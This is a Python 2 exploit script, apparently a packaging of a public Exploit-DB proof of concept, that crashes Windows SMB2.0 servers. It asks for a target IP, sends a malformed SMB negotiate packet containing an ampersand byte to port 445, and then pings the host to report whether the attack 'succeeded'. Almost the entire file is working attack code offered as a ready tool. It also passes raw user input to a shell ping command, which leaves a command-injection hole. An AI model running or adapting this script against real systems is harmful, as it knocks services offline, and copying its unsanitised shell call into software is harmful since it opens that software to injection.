#!/usr/bin/python

import os
import re
import sys
from socket import socket

# Ampersand Relay SMB2.0
# https://www.exploit-db.com/exploits/9594/
# slavepens@gmail.com

print chr(27) + "[1;37m" + "<Ampersand Relay Canyon>" + chr(27) + "[0;37m"
print "========================"
target = raw_input("IP = ")

lifeline = re.compile(r"(\d) received")
report = (chr(27) + "[0;92m" + "Target Down, Successful Attack", chr(27) + "[0;93m" + "Partial Response",
          chr(27) + "[0;91m" + "Target Alive, Failed Attack")
host = target, 445

print "======Lock On======="
print "<< " + chr(27) + "[1;95m" + target + chr(27) + "[0;37m" + " >>"
print "===================="
buff = (
    "\x00\x00\x00\x90"
    "\xff\x53\x4d\x42"
    "\x72\x00\x00\x00"
    "\x00\x18\x53\xc8"
    "\x00\x26"  # x26Ampersand Char
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
    "\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
    "\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
    "\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
    "\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
    "\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
    "\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
    "\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
    "\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
    "\x30\x30\x32\x00"
)
print chr(27) + "[0;92m" + "-ARC Armed" + chr(27) + "[0;37m"
s = socket()
print chr(27) + "[0;92m" + "-Waiting link confirmation..." + chr(27) + "[0;37m"
try:
    s.connect(host)
except:
    print chr(27) + "[0;91m" + "-Connection Error" + chr(27) + "[0;37m"
    s.close()
    exit()
else:
    print chr(27) + "[0;92m" + "-Link Established!" + chr(27) + "[0;37m"
    print "===================="
    confirm = raw_input("Launch AR-Canyon? y/n: ")
    if confirm == "y":
        s.send(buff)
        pingaling = os.popen("ping -q -c3 " + target, "r")
        print "Searching", target,
        sys.stdout.flush()
        while 1:
            line = pingaling.readline()
            if not line:
                break
            igot = re.findall(lifeline, line)
            if igot:
                print report[int(igot[0])]
        s.close()
    else:
        print chr(27) + "[0;93m" + "-Closing connection"
        s.close()
        exit()
